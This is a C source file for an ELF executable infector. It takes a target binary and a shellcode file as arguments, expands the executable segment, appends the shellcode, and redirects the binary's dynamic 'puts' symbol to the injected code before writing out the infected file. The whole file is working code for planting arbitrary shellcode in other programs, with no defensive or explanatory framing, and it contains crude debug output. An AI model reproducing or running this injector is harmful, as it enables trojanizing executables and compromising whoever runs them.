#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<string.h>
#include<elf.h>

typedef struct ELF_FORMAT{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
}elf_format;



#define Ehdr Elf64_Ehdr
#define Shdr Elf64_Shdr
#define Phdr Elf64_Phdr



int space = 0;
char* sh_tab = 0; 
char* dy_tab = 0;
char* puts_str = "puts\0";
Elf64_Sym* puts_dysym = 0;
void rela_sym_map(Elf64_Rela *rela, int size, Elf64_Sym *sym){
    
    int blk = size/sizeof(Elf64_Rela);
    printf("\n=====> in rela: 0x%x\n",rela);
    
    for(int i =0 ;i<blk ; i++){
        int rela_s_off = ELF64_R_SYM(rela[i].r_info);
        printf("offset:%d\n",rela_s_off);
        Elf64_Sym *s = sym+rela_s_off;
        printf("st_name: 0x%x\n",s->st_name);
        printf("sym: %s\n"
                "offset: 0x%x\n",
                dy_tab+s->st_name,s->st_value
                );
        if (strcmp(dy_tab+s->st_name,puts_str)==0){
            puts_dysym = s;
        }
        
    }

}

char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
    
    Ehdr *ehdr = (Ehdr*)f_buf;
    Phdr *phdr = (Phdr*)(f_buf+(int)ehdr->e_phoff);
    Shdr *shdr = (Shdr*)(f_buf+(int)ehdr->e_shoff);


    sh_tab = shdr[ehdr->e_shstrndx].sh_offset + f_buf;
    char hit_sh[] = ".rela.plt\0";


    space = 0x2000;
    
    char sh_code_end[] = "\xc3";
                    
    int sh_code_l = 1;
    /*memcpy(sh_code+2,(char*)&ehdr->e_entry,8);*/
    
    
    int x_offset=0,x_size=0;
    size_t new_entry = 0;
    printf("PFX|PFW=%d",PF_X||PF_W);
    for( int ind=0; ind < ehdr->e_phnum ; ind++ ){

        Phdr *p = &phdr[ind];
        printf("Program header %d, flag=%d\n",ind,p->p_flags);
        if(p->p_flags==(PF_X|PF_R)){
            printf("@@!!!\n");
            x_offset = p->p_offset;
            x_size = p->p_filesz;
            new_entry = p->p_vaddr + p->p_filesz;
            p->p_memsz += sc_len+sh_code_l;
            p->p_filesz += sc_len+sh_code_l;
            break;
        }
    }
    
    printf("a\n");
    for( int ind=0 ; ind<ehdr->e_phnum ; ind++ ){

        Phdr *p = &phdr[ind];
        
        if(p->p_offset>x_offset+x_size){
            p->p_offset+=space;

        }
    }
    printf("a\n");
    int sym = 0;
    Elf64_Rela ** relas =  malloc(sizeof(Elf64_Rela*)*2);
    int *sizes = malloc(sizeof(int)*2);
    int i =0 ;
    for( int ind=0; ind<ehdr->e_shnum; ind++ ){
        Shdr *s = &shdr[ind];
        char *s_name = shdr->sh_name+sh_tab;

        //find rela plt
        /*if(strcmp(s_name,hit_sh)==0){*/
        if(strcmp(s->sh_name+sh_tab,".dynstr")==0){
            dy_tab = s->sh_offset+f_buf;
        }
        if(s->sh_type==SHT_DYNSYM && sym==0){
            printf("_symtab_name: %s \n",s->sh_name+sh_tab);
            sym = s->sh_offset;
        }
        if(s->sh_type==SHT_RELA){
            sizes[i] = s->sh_size;
            Elf64_Rela *rela = (Elf64_Rela *)(f_buf+s->sh_offset);
            relas[i] = rela;
            i++;
            /*sym = ELF64_R_SYM(rela->r_info);*/
            printf("rela off: 0x%x\n",s->sh_offset);
        }
        
        if(s->sh_offset >= x_offset+x_size){
            s->sh_offset+= space;

        }
        else if(s->sh_offset+s->sh_size==x_offset+x_size){
            s->sh_size += sc_len+sh_code_l;
        }
    }
    for (i=0;i<2;i++){
        rela_sym_map(relas[i],sizes[i],(Elf64_Sym*)(f_buf+sym));
    }
    puts_dysym->st_info = ELF64_ST_INFO(STB_LOCAL,STT_FILE);
    /*memset(puts_dysym ,0, sizeof(Elf64_Sym));*/
    puts_dysym->st_value = new_entry;
    printf("a\n");

    /*ehdr->e_entry = new_entry;*/
    ehdr->e_shoff += space;
    char * infect_buf = malloc(sizeof(char)*(f_len+space));
    printf("infect_buf: 0x%08x , f_buf: 0x%08x , x_offs = %d, x_size: %d",
            infect_buf,f_buf,x_offset,x_size);
    printf("b\n");
    memcpy(infect_buf,f_buf,x_offset+x_size);
    printf("c\n");
    memcpy(infect_buf+x_offset+x_size , shellcode , sc_len );
    memcpy(infect_buf+x_offset+x_size+sc_len, sh_code_end, sh_code_l);
    memcpy(infect_buf+x_offset+x_size+space, f_buf+x_offset+x_size, f_len-(x_offset+x_size));
    return infect_buf;



}



int main(int argc,char** argv){
    printf("0:%s,1:%s,2:%s",argv[0],argv[1],argv[2]);
    FILE *data = fopen(argv[1],"rb");
    FILE *shell = fopen(argv[2],"rb");
    
    struct stat filestat;
    int sh_size,data_size;

    if(fstat(fileno(data),&filestat)){
        perror("fuck");
        exit(1);
    }
    data_size = filestat.st_size;

    if(fstat(fileno(shell),&filestat)){
        perror("fuck");
        exit(1);
    }
    sh_size = filestat.st_size;

    char* data_buf = (char*)malloc(sizeof(char)*data_size);
    char* sh_buf = (char*)malloc(sizeof(char)*sh_size);

    fread(data_buf,1,data_size,data);
    fread(sh_buf,1,sh_size,shell);

    char* inj = inject(data_buf,sh_buf,data_size,sh_size);

    FILE *out_f = fopen(argv[3],"wb");

    fwrite(inj,1,data_size+space,out_f);

    printf("success\n");
    return 0;
}

